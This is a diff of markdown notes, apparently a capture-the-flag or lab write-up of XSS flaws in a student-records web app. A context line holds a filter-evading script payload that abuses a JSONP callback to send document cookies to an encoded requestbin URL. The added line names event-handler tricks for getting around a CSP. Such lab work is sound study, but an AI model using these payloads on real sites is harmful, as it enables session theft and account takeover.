@@ -79,6 +79,8 @@ Last name search field vulnerable to XSS - '.' and '+' characters not allowed
     ```html
     <<script>ascript src=/students.jsonp?callback=fetch(`${atob(BASE64_ENCODED_REQUESTBIN_URL)}${document['cookie']}`);render></script>
     ```
+  
+- Third vulnerability: reflected XSS for last name when creating duplicate user - CSP blocks script-src insecure inline - use image onerror, onload, iframe etc.
 
 ## report subdomain
 
